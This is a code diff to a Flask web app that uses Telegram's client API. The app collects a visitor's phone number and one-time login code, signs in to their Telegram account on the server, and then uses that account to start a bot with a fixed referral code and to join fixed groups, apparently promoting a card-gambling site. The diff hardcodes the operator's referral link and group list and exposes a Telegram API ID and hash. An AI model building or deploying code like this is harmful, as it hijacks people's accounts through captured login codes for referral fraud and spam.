@@ -10,13 +10,16 @@ app.secret_key = 'your_secret_key'
 # Thông tin API Telegram
 API_ID = 25437670  # Thay bằng API ID của bạn
 API_HASH = "7a60d938df5a25122326f007055013b6"  # Thay bằng API Hash của bạn
+BOT_LINK = "https://t.me/TriAnCodeNetwin_bot?start=6256232725"
+GROUP_LINKS = [
+    "https://t.me/saowingamebaidangcap",
+    "https://t.me/saowindangcap",
+]
 
-# Hàm trích xuất thông tin bot
 def extract_bot_info(bot_link):
     match = re.search(r't\.me/([a-zA-Z0-9_]+)\?start=([a-zA-Z0-9_-]+)', bot_link)
     return (match.group(1), match.group(2)) if match else (None, None)
 
-# Hàm trích xuất mã mời nhóm
 def extract_invite_hash(group_link):
     match = re.search(r't\.me/\+([a-zA-Z0-9_-]+)', group_link)
     return match.group(1) if match else None
@@ -25,8 +28,6 @@ def extract_invite_hash(group_link):
 def index():
     if request.method == 'POST':
         session['phone'] = request.form['phone']
-        session['bot_link'] = request.form['bot_link']
-        session['group_links'] = request.form['group_links'].split('\n')
         return redirect(url_for('verify_otp'))
     return render_template('index.html')
 
@@ -37,11 +38,7 @@ def verify_otp():
     
     client.connect()
     if not client.is_user_authorized():
-        try:
-            client.send_code_request(session['phone'])
-        except Exception as e:
-            return f"Lỗi gửi mã OTP: {e}"
-        
+        client.send_code_request(session['phone'])
         if request.method == 'POST':
             try:
                 client.sign_in(session['phone'], request.form['otp'])
@@ -60,7 +57,7 @@ def tasks():
         if not client.is_user_authorized():
             return "Lỗi: Tài khoản chưa được xác thực."
         
-        bot_username, referral_code = extract_bot_info(session['bot_link'])
+        bot_username, referral_code = extract_bot_info(BOT_LINK)
         if bot_username and referral_code:
             try:
                 bot_entity = client.get_entity(bot_username)
@@ -68,7 +65,7 @@ def tasks():
             except Exception as e:
                 return f"Lỗi khi tham gia bot: {e}"
         
-        for group_link in session['group_links']:
+        for group_link in GROUP_LINKS:
             invite_hash = extract_invite_hash(group_link)
             try:
                 if invite_hash:
